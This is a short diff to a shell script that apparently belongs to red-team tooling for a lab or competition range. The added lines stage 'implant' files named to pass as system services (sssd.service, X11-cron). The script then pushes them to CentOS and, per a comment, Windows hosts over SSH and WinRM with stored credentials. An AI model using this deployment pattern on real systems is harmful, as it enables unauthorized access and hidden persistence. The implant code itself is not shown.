@@ -19,9 +19,12 @@ else
 	echo "Your IP Address Is: $ip_address"
 fi
 
+# Copy Files To Stage Folder
 mkdir ~/Desktop/Implants
 cp ~/Desktop/Files/sssd.service ~/Desktop/Implants/sssd.service
+cp X11-cron ~/Desktop/Implants/X11-cron
 
+# Set Variables
 windows_ip="10.0.10.${team_id}4"
 centos_ip="10.0.10.${team_id}3"
 ubuntu_ip="10.0.10.${team_id}2"
@@ -48,3 +51,5 @@ cd ../
 
 # SSH -> Curl the Implant (CentOS)
 ./ConSSH.exp $ip_address $centos_ip $centos_user $centos_pass
+
+# WINRM -> Curl the Implant (Windows)
